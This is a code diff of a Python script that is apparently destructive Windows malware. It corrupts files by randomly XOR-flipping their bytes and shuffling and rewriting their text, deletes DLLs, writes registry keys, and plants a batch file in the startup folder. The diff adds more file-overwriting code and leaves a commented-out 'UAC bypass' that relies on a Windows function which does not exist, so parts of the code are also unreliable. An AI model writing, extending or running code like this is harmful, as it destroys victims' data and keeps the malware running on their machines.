@@ -2,13 +2,14 @@ try:
   import random
   import os
   import sys
-  import pyautogui
+  import win32con
   import rsa
   import hashlib
   import string
   import ctypes
+  import win32gui
   import binascii
-  import _winreg
+  import winreg
   import platform
   import time, datetime
 except ImportError:
@@ -48,9 +49,9 @@ class crytography_functions:
     return returnvalue
 
   def checkfile(file, print=None):
-    if os.path.isfile(file) == False:
+    if not os.path.isfile(file):
       returnList = ("File not found", "Or is not a file")
-    if os.path.isfile(file) == True:
+    if os.path.isfile(file):
       with open(file, "r") as File:
         lines = File.readlines()
         size = ("Size:", os.path.getsize(file))
@@ -67,6 +68,8 @@ class crytography_functions:
     with open(file, "r+") as Fout:
       for line in Fout:
         lineList = list(line)
+        random.shuffle(lineList)
+        Fout.write(''.join(lineList))
         randoms = list(string.printable)
 
       for i in lineList:
@@ -359,9 +362,10 @@ class functions():
 
   def minimize_current_window():
     try:
-      pyautogui.hotkey('win', 'm')
+      Minimize = win32gui.GetForegroundWindow()
+      win32gui.ShowWindow(Minimize, win32con.SW_MINIMIZE)
       return True
-    except pyautogui.FailSafeException:
+    except:
       return False
 
   def delete_dll():
@@ -381,12 +385,12 @@ class functions():
       path_to_file = os.path.join(source_folder, file)
       with open(path_to_file, "rb") as binary_file:
         data = binary_file.read()
-        
+
         for bit_index in range(len(data)):
           switch = random.choice([True, False])
           if switch:
             data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF]) + data[bit_index + 1:]
-            
+
       with open(path_to_file, "wb") as binary_file:
         binary_file.write(data)
 
@@ -411,10 +415,10 @@ class functions():
 
     def create_reg_key(key, value):
       try:
-        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
-        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
-        _winreg.CloseKey(registry_key)
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
+        winreg.CloseKey(registry_key)
       except WindowsError:
         raise
 
@@ -441,16 +445,16 @@ class functions():
         pass
 
   # ALTERNATIVE BYPASS (TEST FIRST)
-  #def UACbypass():
-  #try:
+  # def UACbypass():
+  # try:
   # Get the current value of the UAC
-  #val = ctypes.windll.shell32.IsUserAnAdmin()
+  # val = ctypes.windll.shell32.IsUserAnAdmin()
   # Set the UAC to 0 (disabled)
-  #ctypes.windll.shell32.SetUserAccountControl(0)
+  # ctypes.windll.shell32.SetUserAccountControl(0)
   # Return the result
-  #return val
-  #except:
-  #sys.exit(1)
+  # return val
+  # except:
+  # sys.exit(1)
 
   def startup_surprise():
     with open(startupDir + '/windowsserver.bat', 'w') as fin:
